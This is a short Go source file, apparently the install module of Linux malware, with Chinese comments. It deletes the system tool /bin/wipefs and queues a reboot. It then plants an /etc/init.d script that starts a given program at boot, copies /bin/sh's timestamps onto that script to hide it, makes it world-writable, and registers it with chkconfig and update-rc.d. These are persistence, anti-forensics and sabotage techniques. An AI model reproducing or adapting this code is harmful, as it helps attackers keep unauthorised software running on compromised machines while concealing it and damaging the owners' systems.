package add

import (
	"os"
	"cpack"
	"fmt"
)

func Boot( filenameOnly string) {
	boot1 :=filenameOnly
	os.Remove("/bin/wipefs")//有一招叫啥
	boot2 :=" reboot"
	boot1 += boot2
	//	fmt.Println(boot1) 输出命令
	cpack.Autoboot(boot1)
}
//linux不可用\n\r，\n即可
func Sh(a,b string){
	//第一个是程序自身文件名，第二个是目录不带文件名，第三个文件名
	path:="/etc/init.d/"
	path += a
	s := fmt.Sprintf("#!/bin/sh\n\ncase \"$1\" in\nstart)\n\tcd %s\n\t./%s\n;;\nstop)\n\n;;\nesac\n\nexit 0",b,a)
	Createfile(path,s)
	cpack.System("touch -r /bin/sh "+path);
	cpack.System("chmod 777 "+path);
	cpack.System("chkconfig --add "+a);
	cpack.System("chkconfig "+a+" no");
	cpack.System("update-rc.d "+a+" defaults 95");
	//cpack.System("service "+a+" start");
}